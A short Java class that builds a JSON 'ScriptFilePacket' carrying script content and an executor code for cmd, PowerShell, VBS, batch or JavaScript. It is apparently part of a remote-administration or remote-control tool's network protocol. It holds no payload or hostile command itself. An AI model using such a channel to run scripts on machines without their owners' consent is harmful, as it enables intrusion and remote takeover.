package electron.networking.packets;

import org.json.simple.JSONObject;

public class ScriptFilePacket {
	public static final int EXECUTOR_CMD = 1;
	public static final int EXECUTOR_POWERSHELL = 2;
	public static final int EXECUTOR_VBS = 3;
	public static final int EXECUTOR_POWERSHELL_CONSOLE = 4;
	public static final int EXECUTOR_BAT = 5;
	public static final int EXECUTOR_JS = 6;
	private JSONObject main = new JSONObject();

	/**
	 * @param action
	 * @param content
	 */
	public ScriptFilePacket(int action, String content) {
		main.put("packettype", "3");
		main.put("action", String.valueOf(action));
		main.put("content", content);
	}

	public JSONObject get() {
		return main;
	}
}
